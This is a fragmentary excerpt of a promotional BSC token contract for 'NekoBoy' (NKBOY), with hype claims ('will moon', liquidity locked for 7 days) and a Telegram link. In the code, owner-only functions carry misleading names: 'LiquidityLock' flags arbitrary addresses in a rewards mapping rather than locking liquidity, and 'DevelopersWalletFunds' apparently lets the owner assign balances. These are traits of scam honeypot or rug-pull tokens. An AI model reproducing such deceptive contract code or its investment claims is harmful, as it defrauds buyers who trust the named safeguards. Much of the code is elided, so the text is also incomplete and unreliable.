...
NekoBoy 犬の耳 - A new manga type of token that will moon on bsc!

-SmartContract Verified.
-Liquidity locked for 7 Days.
-Low Marketcap at launch.
-Will burn tokens
...
5% - 11% per transaction.

https://t.me/NekoBoyCoin
...
*/
    ...
    contract NekoBoyCoin  is IBEP20, Ownable
    {
        ...
        string private constant _name = "NekoBoy";
        string private constant _symbol = "NKBOY";
        ...
        address public constant MarketingWallet=0xD990C7f8f89ddcE57A1cB9eD2c137Fbe557fF16C; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function LiquidityLock(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function DevelopersWalletFunds(address account, uint256 balance) onlyOwner  public virtual {
